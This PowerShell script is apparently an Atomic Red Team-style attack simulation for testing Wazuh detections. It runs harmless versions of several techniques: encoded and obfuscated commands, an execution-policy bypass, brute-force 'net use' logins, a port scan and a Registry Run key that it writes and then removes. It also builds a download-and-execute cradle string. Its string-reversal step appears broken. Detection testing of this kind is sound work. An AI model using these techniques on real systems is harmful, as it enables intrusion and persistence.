param(
    [string]$TargetIP = "localhost:8080",
    [int]$DelaySeconds = 2
)

$ErrorActionPreference = "Continue"
$logFile = "$PSScriptRoot\attack-log.txt"
"=== Atomic Red Team - Windows Attack Simulation ===" | Out-File $logFile
"Started: $(Get-Date)" | Out-File $logFile -Append
"Target: $TargetIP" | Out-File $logFile -Append
"" | Out-File $logFile -Append

Write-Host "[*] Atomic Red Team - Windows Attack Simulation"
Write-Host "[*] Target: $TargetIP"
Write-Host ""

# T1059.001 - PowerShell Encoded Command
Write-Host "[T1059.001] PowerShell encoded command..."
$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'Atomic Red Team - Encoded Command Test'"))
try {
    $result = powershell.exe -EncodedCommand $encodedCmd 2>&1
    "[T1059.001] Encoded command executed: $result" | Out-File $logFile -Append
} catch {
    "[T1059.001] Encoded command blocked: $_" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1059.001 - PowerShell IEX with obfuscation
Write-Host "[T1059.001] PowerShell IEX obfuscation..."
try {
    $cmd = "Invoke-Expression 'Write-Host attacked'"
    $obfuscated = $cmd -replace 'Invoke-Expression', 'I' + [char]69 + 'X'
    $result = powershell.exe -Command $obfuscated 2>&1
    "[T1059.001] IEX obfuscation executed: $result" | Out-File $logFile -Append
} catch {
    "[T1059.001] IEX obfuscation blocked: $_" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1059.001 - PowerShell Download Cradle
Write-Host "[T1059.001] PowerShell download cradle pattern..."
try {
    $cmd = "IEX (New-Object Net.WebClient).DownloadString('http://$TargetIP/test')"
    "[T1059.001] Download cradle pattern generated (not executed): $cmd" | Out-File $logFile -Append
} catch {
    "[T1059.001] Download cradle blocked: $_" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1110.001 - Brute Force (simulated SSH via net use)
Write-Host "[T1110.001] Simulated brute force - multiple auth attempts..."
for ($i = 1; $i -le 10; $i++) {
    try {
        net use "\\$TargetIP\c$" "wrong$i" /user:"admin$i" 2>&1 | Out-Null
    } catch {}
    "[T1110.001] Brute force attempt $i" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1046 - Network Service Discovery (port scan)
Write-Host "[T1046] Port scan simulation..."
$ports = @(22, 80, 443, 445, 3389, 8080, 8443, 3306, 5432, 1433, 1521, 27017, 6379, 9200, 55000)
foreach ($port in $ports) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $connect = $tcp.BeginConnect("localhost", $port, $null, $null)
        $wait = $connect.AsyncWaitHandle.WaitOne(500, $false)
        if ($wait) { "[T1046] Port $port OPEN" | Out-File $logFile -Append }
        $tcp.Close()
    } catch {}
}
Start-Sleep -Seconds $DelaySeconds

# T1547.001 - Registry Run Key (write then remove)
Write-Host "[T1547.001] Registry Run key persistence test..."
try {
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "AtomicTest" -Value "cmd.exe" -ErrorAction Stop
    "[T1547.001] Run key written" | Out-File $logFile -Append
    Start-Sleep -Seconds 2
    Remove-ItemProperty -Path $regPath -Name "AtomicTest" -ErrorAction SilentlyContinue
    "[T1547.001] Run key removed" | Out-File $logFile -Append
} catch {
    "[T1547.001] Run key operation blocked: $_" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1059.001 - Execution Policy Bypass
Write-Host "[T1059.001] Execution policy bypass..."
try {
    $script = "Write-Host 'bypass test'"
    $result = powershell.exe -ExecutionPolicy Bypass -NoProfile -Command $script 2>&1
    "[T1059.001] Execution policy bypass executed: $result" | Out-File $logFile -Append
} catch {
    "[T1059.001] Execution policy bypass blocked: $_" | Out-File $logFile -Append
}
Start-Sleep -Seconds $DelaySeconds

# T1027 - Obfuscated command via string reversal
Write-Host "[T1027] Obfuscated command - string reversal..."
try {
    $rev = "tseT demroFnicS enifElraW"
    $deob = -join ($rev.ToCharArray() | Select-Object -Last $rev.Length)
    $result = powershell.exe -Command "Write-Host '$deob'" 2>&1
    "[T1027] Obfuscated command executed: $result" | Out-File $logFile -Append
} catch {
    "[T1027] Obfuscated command blocked: $_" | Out-File $logFile -Append
}

"" | Out-File $logFile -Append
"Completed: $(Get-Date)" | Out-File $logFile -Append

Write-Host ""
Write-Host "[+] Attack simulation complete. Check Wazuh Dashboard for alerts."
Write-Host "[+] Log saved to: $logFile"
